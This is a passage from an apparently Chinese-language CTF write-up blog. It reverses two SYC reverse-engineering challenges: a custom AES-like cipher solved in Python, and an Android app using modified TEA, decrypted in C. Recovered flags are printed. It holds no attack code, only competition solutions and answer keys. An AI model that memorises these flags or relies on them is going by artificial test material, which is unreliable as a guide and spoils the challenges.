class="line">   <span class="number">10</span>, <span class="number">120</span>, <span class="number">121</span>, <span class="number">136</span>, <span class="number">126</span>, <span class="number">124</span>, <span class="number">131</span>,  <span class="number">42</span>, <span class="number">107</span>, <span class="number">113</span>, </span><br><span class="line">  <span class="number">107</span>, <span class="number">115</span>, <span class="number">120</span>, <span class="number">136</span>,  <span class="number">20</span>,  <span class="number">10</span>, <span class="number">120</span>, <span class="number">121</span>, <span class="number">136</span>,  <span class="number">10</span>]</span><br><span class="line"></span><br><span class="line">S = [<span class="number">99</span>, <span class="number">124</span>, <span class="number">119</span>, <span class="number">123</span>, <span class="number">242</span>, <span class="number">107</span>, <span class="number">111</span>, <span class="number">197</span>,  <span class="number">48</span>,   <span class="number">1</span>, </span><br><span class="line">  <span class="number">103</span>,  <span class="number">43</span>, <span class="number">254</span>, <span class="number">215</span>, <span class="number">171</span>, <span class="number">118</span>, <span class="number">202</span>, <span class="number">130</span>, <span class="number">201</span>, <span class="number">125</span>, </span><br><span class="line">  <span class="number">250</span>,  <span class="number">89</span>,  <span class="number">71</span>, <span class="number">240</span>, <span class="number">173</span>, <span class="number">212</span>, <span class="number">162</span>, <span class="number">175</span>, <span class="number">156</span>, <span class="number">164</span>, </span><br><span class="line">  <span class="number">114</span>, <span class="number">192</span>, <span class="number">183</span>, <span class="number">253</span>, <span class="number">147</span>,  <span class="number">38</span>,  <span class="number">54</span>,  <span class="number">63</span>, <span class="number">247</span>, <span class="number">204</span>, </span><br><span class="line">   <span class="number">52</span>, <span class="number">165</span>, <span class="number">229</span>, <span class="number">241</span>, <span class="number">113</span>, <span class="number">216</span>,  <span class="number">49</span>,  <span class="number">21</span>,   <span class="number">4</span>, <span class="number">199</span>, </span><br><span class="line">   <span class="number">35</span>, <span class="number">195</span>,  <span class="number">24</span>, <span class="number">150</span>,   <span class="number">5</span>, <span class="number">154</span>,   <span class="number">7</span>,  <span class="number">18</span>, <span class="number">128</span>, <span class="number">226</span>, </span><br><span class="line">  <span class="number">235</span>,  <span class="number">39</span>, <span class="number">178</span>, <span class="number">117</span>,   <span class="number">9</span>, <span class="number">131</span>,  <span class="number">44</span>,  <span class="number">26</span>,  <span class="number">27</span>, <span class="number">110</span>, </span><br><span class="line">   <span class="number">90</span>, <span class="number">160</span>,  <span class="number">82</span>,  <span class="number">59</span>, <span class="number">214</span>, <span class="number">179</span>,  <span class="number">41</span>, <span class="number">227</span>,  <span class="number">47</span>, <span class="number">132</span>, </span><br><span class="line">   <span class="number">83</span>, <span class="number">209</span>,   <span class="number">0</span>, <span class="number">237</span>,  <span class="number">32</span>, <span class="number">252</span>, <span class="number">177</span>,  <span class="number">91</span>, <span class="number">106</span>, <span class="number">203</span>, </span><br><span class="line">  <span class="number">190</span>,  <span class="number">57</span>,  <span class="number">74</span>,  <span class="number">76</span>,  <span class="number">88</span>, <span class="number">207</span>, <span class="number">208</span>, <span class="number">239</span>, <span class="number">170</span>, <span class="number">251</span>, </span><br><span class="line">   <span class="number">67</span>,  <span class="number">77</span>,  <span class="number">51</span>, <span class="number">133</span>,  <span class="number">69</span>, <span class="number">249</span>,   <span class="number">2</span>, <span class="number">127</span>,  <span class="number">80</span>,  <span class="number">60</span>, </span><br><span class="line">  <span class="number">159</span>, <span class="number">168</span>,  <span class="number">81</span>, <span class="number">163</span>,  <span class="number">64</span>, <span class="number">143</span>, <span class="number">146</span>, <span class="number">157</span>,  <span class="number">56</span>, <span class="number">245</span>, </span><br><span class="line">  <span class="number">188</span>, <span class="number">182</span>, <span class="number">218</span>,  <span class="number">33</span>,  <span class="number">16</span>, <span class="number">255</span>, <span class="number">243</span>, <span class="number">210</span>, <span class="number">205</span>,  <span class="number">12</span>, </span><br><span class="line">   <span class="number">19</span>, <span class="number">236</span>,  <span class="number">95</span>, <span class="number">151</span>,  <span class="number">68</span>,  <span class="number">23</span>, <span class="number">196</span>, <span class="number">167</span>, <span class="number">126</span>,  <span class="number">61</span>, </span><br><span class="line">  <span class="number">100</span>,  <span class="number">93</span>,  <span class="number">25</span>, <span class="number">115</span>,  <span class="number">96</span>, <span class="number">129</span>,  <span class="number">79</span>, <span class="number">220</span>,  <span class="number">34</span>,  <span class="number">42</span>, </span><br><span class="line">  <span class="number">144</span>, <span class="number">136</span>,  <span class="number">70</span>, <span class="number">238</span>, <span class="number">184</span>,  <span class="number">20</span>, <span class="number">222</span>,  <span class="number">94</span>,  <span class="number">11</span>, <span class="number">219</span>, </span><br><span class="line">  <span class="number">224</span>,  <span class="number">50</span>,  <span class="number">58</span>,  <span class="number">10</span>,  <span class="number">73</span>,   <span class="number">6</span>,  <span class="number">36</span>,  <span class="number">92</span>, <span class="number">194</span>, <span class="number">211</span>, </span><br><span class="line">  <span class="number">172</span>,  <span class="number">98</span>, <span class="number">145</span>, <span class="number">149</span>, <span class="number">228</span>, <span class="number">121</span>, <span class="number">231</span>, <span class="number">200</span>,  <span class="number">55</span>, <span class="number">109</span>, </span><br><span class="line">  <span class="number">141</span>, <span class="number">213</span>,  <span class="number">78</span>, <span class="number">169</span>, <span class="number">108</span>,  <span class="number">86</span>, <span class="number">244</span>, <span class="number">234</span>, <span class="number">101</span>, <span class="number">122</span>, </span><br><span class="line">  <span class="number">174</span>,   <span class="number">8</span>, <span class="number">186</span>, <span class="number">120</span>,  <span class="number">37</span>,  <span class="number">46</span>,  <span class="number">28</span>, <span class="number">166</span>, <span class="number">180</span>, <span class="number">198</span>, </span><br><span class="line">  <span class="number">232</span>, <span class="number">221</span>, <span class="number">116</span>,  <span class="number">31</span>,  <span class="number">75</span>, <span class="number">189</span>, <span class="number">139</span>, <span class="number">138</span>, <span class="number">112</span>,  <span class="number">62</span>, </span><br><span class="line">  <span class="number">181</span>, <span class="number">102</span>,  <span class="number">72</span>,   <span class="number">3</span>, <span class="number">246</span>,  <span class="number">14</span>,  <span class="number">97</span>,  <span class="number">53</span>,  <span class="number">87</span>, <span class="number">185</span>, </span><br><span class="line">  <span class="number">134</span>, <span class="number">193</span>,  <span class="number">29</span>, <span class="number">158</span>, <span class="number">225</span>, <span class="number">248</span>, <span class="number">152</span>,  <span class="number">17</span>, <span class="number">105</span>, <span class="number">217</span>, </span><br><span class="line">  <span class="number">142</span>, <span class="number">148</span>, <span class="number">155</span>,  <span class="number">30</span>, <span class="number">135</span>, <span class="number">233</span>, <span class="number">206</span>,  <span class="number">85</span>,  <span class="number">40</span>, <span class="number">223</span>, </span><br><span class="line">  <span class="number">140</span>, <span class="number">161</span>, <span class="number">137</span>,  <span class="number">13</span>, <span class="number">191</span>, <span class="number">230</span>,  <span class="number">66</span>, <span class="number">104</span>,  <span class="number">65</span>, <span class="number">153</span>, </span><br><span class="line">   <span class="number">45</span>,  <span class="number">15</span>, <span class="number">176</span>,  <span class="number">84</span>, <span class="number">187</span>,  <span class="number">22</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">24</span>):</span><br><span class="line">    v13[i] -= <span class="number">10</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(v13))</span><br><span class="line"><span class="comment"># v13 = b&#x27;place inout your flag: \n&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>):</span><br><span class="line">    v10[i] -= <span class="number">10</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(v10))</span><br><span class="line"><span class="comment"># v10 = b&#x27;yes! you are right!\n\x00&#x27;</span></span><br><span class="line"><span class="comment"># v11 = b&#x27;no~try again~\n\x00&#x27;</span></span><br><span class="line"><span class="comment"># v12 = b&#x27;no~\x00&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># len(s) == 32</span></span><br><span class="line"></span><br><span class="line">v7 = [k-<span class="number">10</span> <span class="keyword">for</span> k <span class="keyword">in</span> v16]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(v7))</span><br><span class="line"><span class="comment"># v16 = v7 = b&#x27;do_you_konw_SYC?&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># s[5] = 46</span></span><br><span class="line"><span class="comment"># s[10] = 108</span></span><br><span class="line"><span class="comment"># s[17] = 48</span></span><br><span class="line"></span><br><span class="line">v18 = [<span class="number">100</span>, <span class="number">111</span>,  <span class="number">95</span>, <span class="number">121</span>, <span class="number">111</span>, <span class="number">117</span>,  <span class="number">95</span>, <span class="number">107</span>, <span class="number">111</span>, <span class="number">110</span>, </span><br><span class="line">  <span class="number">119</span>,  <span class="number">95</span>,  <span class="number">83</span>,  <span class="number">89</span>,  <span class="number">67</span>,  <span class="number">63</span>,  <span class="number">39</span>, <span class="number">199</span>, <span class="number">144</span>, <span class="number">207</span>, </span><br><span class="line">  <span class="number">199</span>, <span class="number">232</span>, <span class="number">144</span>,  <span class="number">20</span>, <span class="number">199</span>, <span class="number">241</span>, <span class="number">130</span>, <span class="number">144</span>, <span class="number">190</span>, <span class="number">146</span>, </span><br><span class="line">   <span class="number">89</span>,  <span class="number">74</span>, <span class="number">235</span>, <span class="number">199</span>, <span class="number">144</span>, <span class="number">207</span>, <span class="number">199</span>, <span class="number">232</span>, <span class="number">144</span>, <span class="number">238</span>, </span><br><span class="line">  <span class="number">199</span>, <span class="number">241</span>, <span class="number">130</span>, <span class="number">144</span>, <span class="number">190</span>, <span class="number">146</span>, <span class="number">146</span>, <span class="number">156</span>, <span class="number">235</span>, <span class="number">199</span>, </span><br><span class="line">  <span class="number">144</span>, <span class="number">207</span>, <span class="number">199</span>, <span class="number">232</span>, <span class="number">144</span>, <span class="number">238</span>, <span class="number">199</span>, <span class="number">241</span>, <span class="number">130</span>, <span class="number">144</span>, </span><br><span class="line">  <span class="number">190</span>, <span class="number">146</span>, <span class="number">146</span>, <span class="number">156</span>, <span class="number">235</span>, <span class="number">199</span>, <span class="number">144</span>, <span class="number">207</span>, <span class="number">199</span>, <span class="number">232</span>, </span><br><span class="line">  <span class="number">144</span>, <span class="number">238</span>, <span class="number">199</span>, <span class="number">241</span>, <span class="number">130</span>, <span class="number">144</span>, <span class="number">190</span>, <span class="number">146</span>, <span class="number">146</span>, <span class="number">156</span>, </span><br><span class="line">  <span class="number">235</span>, <span class="number">199</span>, <span class="number">144</span>, <span class="number">207</span>, <span class="number">199</span>, <span class="number">232</span>, <span class="number">144</span>, <span class="number">238</span>, <span class="number">199</span>, <span class="number">241</span>, </span><br><span class="line">  <span class="number">130</span>, <span class="number">144</span>, <span class="number">190</span>, <span class="number">146</span>, <span class="number">146</span>, <span class="number">156</span>, <span class="number">235</span>, <span class="number">199</span>, <span class="number">144</span>, <span class="number">207</span>, </span><br><span class="line">  <span class="number">199</span>, <span class="number">232</span>, <span class="number">144</span>, <span class="number">238</span>, <span class="number">199</span>, <span class="number">241</span>, <span class="number">130</span>, <span class="number">144</span>, <span class="number">190</span>, <span class="number">146</span>, </span><br><span class="line">  <span class="number">146</span>, <span class="number">156</span>, <span class="number">235</span>, <span class="number">199</span>, <span class="number">144</span>, <span class="number">207</span>, <span class="number">199</span>, <span class="number">232</span>, <span class="number">144</span>, <span class="number">238</span>, </span><br><span class="line">  <span class="number">199</span>, <span class="number">241</span>, <span class="number">130</span>, <span class="number">144</span>, <span class="number">190</span>, <span class="number">146</span>, <span class="number">146</span>, <span class="number">156</span>, <span class="number">235</span>, <span class="number">199</span>, </span><br><span class="line">  <span class="number">144</span>, <span class="number">207</span>, <span class="number">199</span>, <span class="number">232</span>, <span class="number">144</span>, <span class="number">238</span>, <span class="number">199</span>, <span class="number">241</span>, <span class="number">130</span>, <span class="number">144</span>, </span><br><span class="line">  <span class="number">190</span>, <span class="number">146</span>, <span class="number">146</span>, <span class="number">156</span>, <span class="number">235</span>, <span class="number">199</span>, <span class="number">144</span>, <span class="number">207</span>, <span class="number">199</span>, <span class="number">232</span>, </span><br><span class="line">  <span class="number">144</span>, <span class="number">238</span>, <span class="number">199</span>, <span class="number">241</span>, <span class="number">130</span>, <span class="number">144</span>, <span class="number">190</span>, <span class="number">146</span>, <span class="number">146</span>, <span class="number">156</span>, </span><br><span class="line">  <span class="number">235</span>, <span class="number">199</span>, <span class="number">144</span>, <span class="number">207</span>, <span class="number">199</span>, <span class="number">232</span>, <span class="number">144</span>, <span class="number">238</span>, <span class="number">199</span>, <span class="number">241</span>, </span><br><span class="line">  <span class="number">130</span>, <span class="number">144</span>, <span class="number">190</span>, <span class="number">146</span>, <span class="number">146</span>, <span class="number">156</span>, <span class="number">235</span>,  <span class="number">57</span>, <span class="number">144</span>, <span class="number">207</span>, </span><br><span class="line">  <span class="number">199</span>, <span class="number">232</span>, <span class="number">144</span>, <span class="number">238</span>, <span class="number">199</span>, <span class="number">241</span>, <span class="number">130</span>, <span class="number">144</span>, <span class="number">190</span>, <span class="number">146</span>, </span><br><span class="line">  <span class="number">146</span>, <span class="number">156</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># ----------------------------------------</span></span><br><span class="line"><span class="comment"># encrypt </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ShiftRow</span>(<span class="params">A</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">16</span>,<span class="number">4</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(math.ceil(i/<span class="number">4</span>)):</span><br><span class="line">            A[i],A[i+<span class="number">1</span>],A[i+<span class="number">2</span>],A[i+<span class="number">3</span>] = A[i+<span class="number">1</span>],A[i+<span class="number">2</span>],A[i+<span class="number">3</span>],A[i]</span><br><span class="line">    <span class="keyword">return</span> A</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">transform</span>(<span class="params">A</span>):</span><br><span class="line">    tmp = [<span class="number">0</span>]*<span class="number">16</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        tmp[i] = A[i]</span><br><span class="line">    x = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            A[x] = tmp[<span class="number">4</span>*k+j]</span><br><span class="line">            A[x] = S[A[x]]</span><br><span class="line">            x += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> A</span><br><span class="line"></span><br><span class="line">s = <span class="built_in">list</span>(<span class="string">b&#x27;abcde.ghijllmnopq0stuvwxyz123457&#x27;</span>)</span><br><span class="line">v = [S[s[i]] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)]</span><br><span class="line"></span><br><span class="line">v = ShiftRow(v[:<span class="number">16</span>])+ShiftRow(v[<span class="number">16</span>:])</span><br><span class="line">v = transform(v[:<span class="number">16</span>])+transform(v[<span class="number">16</span>:])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    v[k] ^= v18[k]</span><br><span class="line">    v[k+<span class="number">16</span>] ^= v18[k]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    v[k] = S[v[k]]</span><br><span class="line"></span><br><span class="line">v = ShiftRow(v[:<span class="number">16</span>])+ShiftRow(v[<span class="number">16</span>:])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    v[k] ^= v18[<span class="number">16</span>+k]</span><br><span class="line">    v[k+<span class="number">16</span>] ^= v18[<span class="number">16</span>+k]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(v)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ----------------------------------------</span></span><br><span class="line"><span class="comment"># decrypt </span></span><br><span class="line"></span><br><span class="line">S_inv = [S.index(k) <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">unShiftRow</span>(<span class="params">A</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">16</span>,<span class="number">4</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(math.ceil(i/<span class="number">4</span>)):</span><br><span class="line">            A[i],A[i+<span class="number">1</span>],A[i+<span class="number">2</span>],A[i+<span class="number">3</span>] = A[i+<span class="number">3</span>],A[i],A[i+<span class="number">1</span>],A[i+<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">return</span> A</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">untransform</span>(<span class="params">A</span>):</span><br><span class="line">    A = [S_inv[A[k]] <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>)]</span><br><span class="line">    tmp = [<span class="number">0</span>]*<span class="number">16</span></span><br><span class="line">    x = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            tmp[<span class="number">4</span>*k+j] = A[x]</span><br><span class="line">            x += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"></span><br><span class="line">y = c[:]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    y[k] ^= v18[<span class="number">16</span>+k]</span><br><span class="line">    y[k+<span class="number">16</span>] ^= v18[<span class="number">16</span>+k]</span><br><span class="line"></span><br><span class="line">y = unShiftRow(y[:<span class="number">16</span>])+unShiftRow(y[<span class="number">16</span>:])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    y[k] = S_inv[y[k]]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    y[k] ^= v18[k]</span><br><span class="line">    y[k+<span class="number">16</span>] ^= v18[k]</span><br><span class="line">    </span><br><span class="line">y = untransform(y[:<span class="number">16</span>])+untransform(y[<span class="number">16</span>:])</span><br><span class="line">y = unShiftRow(y[:<span class="number">16</span>])+unShiftRow(y[<span class="number">16</span>:])</span><br><span class="line">y = [S_inv[y[i]] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(y))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;0.o_Thls_1s_n0t_A3s_(q^_^p)&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="ezandroid"><a href="#ezandroid" class="headerlink" title="ezandroid"></a>ezandroid</h3><blockquote><p>喂！三点几啦！饮茶先啦！ (flag需要包上SYC{}提交)</p></blockquote><p>在MainActivity中查看逻辑为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">obj 补足24位 X</span><br><span class="line">sb4 = sb2 = obj 偶数位</span><br><span class="line">sb5 = sb3 = obj 奇数位</span><br><span class="line">4位一组</span><br><span class="line">a|b|c|d -&gt; 整数</span><br><span class="line"></span><br><span class="line">key = [2023708229, -158607964, -2120859654, 1167043672]</span><br><span class="line"></span><br><span class="line">v0,v1,v2=m[0],m[1],m[2]</span><br><span class="line">for i in range(32):</span><br><span class="line">    x+=0x9e3779b9</span><br><span class="line">v0 += ((v1 &lt;&lt; 4) + k0) ^ (v1 + x) ^ ((v1 &gt;&gt; 5) + k1)</span><br><span class="line">v1 += ((v0 &lt;&lt; 4) + k2) ^ (v0 + x) ^ ((v0 &gt;&gt; 5) + k3)</span><br><span class="line">m[0]=v0</span><br><span class="line">for i in range(32):</span><br><span class="line">    x+=0x9e3779b9</span><br><span class="line">v2 += ((v1 &lt;&lt; 4) + k0) ^ (v1 + x) ^ ((v1 &gt;&gt; 5) + k1)</span><br><span class="line">v1 += ((v2 &lt;&lt; 4) + k2) ^ (v2 + x) ^ ((v2 &gt;&gt; 5) + k3)</span><br><span class="line">m[1]=v2</span><br><span class="line">m[0]=v1</span><br></pre></td></tr></table></figure><p>加密逻辑为魔改TEA：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">v, k</span>):</span><br><span class="line">    v0,v1,v2 = v[<span class="number">0</span>],v[<span class="number">1</span>],v[<span class="number">2</span>]</span><br><span class="line">    x = <span class="number">0</span></span><br><span class="line">    delta = <span class="number">0x9E3779B9</span></span><br><span class="line">    k0,k1,k2,k3 = k[<span class="number">0</span>],k[<span class="number">1</span>],k[<span class="number">2</span>],k[<span class="number">3</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        x += delta</span><br><span class="line">        x = x &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        v0 += ((v1 &lt;&lt; <span class="number">4</span>) + k0) ^ (v1 + x) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k1)</span><br><span class="line">        v0 = v0 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        v1 += ((v0 &lt;&lt; <span class="number">4</span>) + k2) ^ (v0 + x) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k3)</span><br><span class="line">        v1 = v1 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    v[<span class="number">0</span>] = v0</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        x += delta</span><br><span class="line">        x = x &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        v2 += ((v1 &lt;&lt; <span class="number">4</span>) + k0) ^ (v1 + x) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k1)</span><br><span class="line">        v2 = v2 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        v1 += ((v2 &lt;&lt; <span class="number">4</span>) + k2) ^ (v2 + x) ^ ((v2 &gt;&gt; <span class="number">5</span>) + k3)</span><br><span class="line">        v1 = v1 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    v[<span class="number">1</span>] = v2</span><br><span class="line">    v[<span class="number">2</span>] = v1</span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"></span><br><span class="line">m = <span class="string">b&#x27;abcdefghijkl&#x27;</span></span><br><span class="line">m = [bytes_to_long(m[<span class="number">4</span>*i:<span class="number">4</span>*(i+<span class="number">1</span>)]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(m)//<span class="number">4</span>)]</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"></span><br><span class="line">key = [<span class="number">2023708229</span>, -<span class="number">158607964</span>, -<span class="number">2120859654</span>, <span class="number">1167043672</span>]</span><br><span class="line">key = [k &amp; <span class="number">0xffffffff</span> <span class="keyword">for</span> k <span class="keyword">in</span> key]</span><br><span class="line"></span><br><span class="line">c = encrypt(m, key)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line">cc = []</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> c:</span><br><span class="line">    cc += <span class="built_in">list</span>(long_to_bytes(k))</span><br><span class="line"><span class="built_in">print</span>(cc)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># bArr = bArr2 = cc = &#x27;a5f892c9cf4b730db48f6650&#x27;</span></span><br><span class="line"><span class="comment"># ad@#E!@a123 = sb5</span></span><br><span class="line"><span class="comment"># eCAS213@!@3 = bArr</span></span><br></pre></td></tr></table></figure><p>带符号解密：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="comment">//解密函数</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">decrypt</span> <span class="params">(<span class="type">int</span>* v, <span class="type">int</span>* k)</span> &#123;</span><br><span class="line">    <span class="type">int</span> v0=v[<span class="number">0</span>], v1=v[<span class="number">2</span>],v2=v[<span class="number">1</span>], sum=(<span class="number">-1640531527</span>)*<span class="number">64</span>, i;</span><br><span class="line">    <span class="type">int</span> delta=<span class="number">0x9e3779b9</span>;</span><br><span class="line">    <span class="type">int</span> k0=k[<span class="number">0</span>], k1=k[<span class="number">1</span>], k2=k[<span class="number">2</span>], k3=k[<span class="number">3</span>];</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;<span class="number">32</span>; i++) &#123;</span><br><span class="line">        v1 -= ((v2&lt;&lt;<span class="number">4</span>) + k2) ^ (v2 + sum) ^ ((v2&gt;&gt;<span class="number">5</span>) + k3);</span><br><span class="line">        v2 -= ((v1&lt;&lt;<span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;<span class="number">5</span>) + k1);</span><br><span class="line">        sum += <span class="number">1640531527</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;<span class="number">32</span>; i++) &#123;</span><br><span class="line">        v1 -= ((v0&lt;&lt;<span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;<span class="number">5</span>) + k3);</span><br><span class="line">        v0 -= ((v1&lt;&lt;<span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;<span class="number">5</span>) + k1);</span><br><span class="line">        sum += <span class="number">1640531527</span>;</span><br><span class="line">    &#125;    </span><br><span class="line">    v[<span class="number">0</span>]=v0; v[<span class="number">1</span>]=v1; v[<span class="number">2</span>]=v2;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> v[<span class="number">3</span>]=&#123;<span class="number">2784531145</span>, <span class="number">3477828365</span>, <span class="number">3029296720</span>&#125;;</span><br><span class="line"><span class="type">int</span> k[<span class="number">4</span>]=&#123;<span class="number">2023708229</span>, <span class="number">-158607964</span>, <span class="number">-2120859654</span>, <span class="number">1167043672</span>&#125;;</span><br><span class="line">    decrypt(&amp;v, k);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%x%x%x&quot;</span>,v[<span class="number">0</span>],v[<span class="number">1</span>],v[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span 